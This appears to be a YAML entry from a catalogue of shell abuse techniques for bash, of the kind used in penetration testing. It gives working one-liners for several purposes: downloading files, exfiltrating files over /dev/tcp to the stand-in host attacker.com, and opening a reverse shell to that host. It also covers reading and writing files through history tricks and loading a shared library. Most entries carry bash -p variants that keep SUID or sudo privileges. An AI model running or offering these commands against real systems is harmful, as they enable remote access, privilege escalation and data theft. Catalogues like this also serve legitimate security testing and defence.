---
functions:
  download:
  - binary: false
    code: |-
      bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
          3<>/dev/tcp/attacker.com/12345 \
          | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
              3<>/dev/tcp/attacker.com/12345 \
              | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
      unprivileged:
    sender: http-server
  - binary: false
    code: |-
      bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
      unprivileged:
    sender: tcp-server
  file-read:
  - binary: false
    code: |-
      bash -c 'echo "$(</path/to/input-file)"'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'echo "$(</path/to/input-file)"'
      unprivileged:
  - binary: false
    code: |-
      HISTTIMEFORMAT=$'\r\e[K'
      history -c
      history -r /path/to/input-file
      history
    comment: |-
      This only works interactively from an existing `bash` session.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      bash -c 'echo DATA >/path/to/output-file'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'echo DATA >/path/to/output-file'
      unprivileged:
  - binary: false
    code: |-
      HISTIGNORE='history *'
      history -c
      DATA
      history -w /path/to/output-file
    comment: |-
      This only works interactively from an existing `bash` session. It adds timestamps to the output file.
    contexts:
      sudo:
      suid:
      unprivileged:
  library-load:
  - code: |-
      bash -c 'enable -f /path/to/lib.so x'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'enable -f /path/to/lib.so x'
      unprivileged:
  reverse-shell:
  - code: |-
      bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
      unprivileged:
    listener: tcp-server
  shell:
  - code: |-
      bash
    contexts:
      sudo:
      suid:
        code: |-
          bash -p
      unprivileged:
  upload:
  - binary: false
    code: |-
      bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
      unprivileged:
    receiver: http-server
  - binary: false
    code: |-
      bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
    contexts:
      sudo:
      suid:
        code: |-
          bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
      unprivileged:
    receiver: tcp-server
...
